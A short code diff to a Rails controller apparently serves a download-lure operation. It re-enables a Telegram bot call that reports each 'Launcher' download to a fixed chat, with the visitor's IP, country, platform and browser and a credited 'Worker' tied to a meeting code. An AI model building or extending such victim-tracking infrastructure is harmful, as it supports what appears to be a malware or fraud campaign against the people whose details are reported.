@@ -16,6 +16,7 @@ class TelegramMessagesController < ApplicationController
     end
 
     text = " #define\n⚠️ Download ⚠️\n🔗 IP: #{ip}\n🌎 Country: #{country}\n👨🏻‍💻 Worker: #{meeting.name} #{meeting.code.upcase}\n📑 Type: Launcher\n💻 Platform: #{params['platform']}\n🌐 Browser: #{params['browser']}"
-    # @bot.api.send_message(chat_id: -1002117494784, text:)
+    @bot.api.send_message(chat_id: -1002117494784, text:)
+    render json: { success: true }
   end
 end
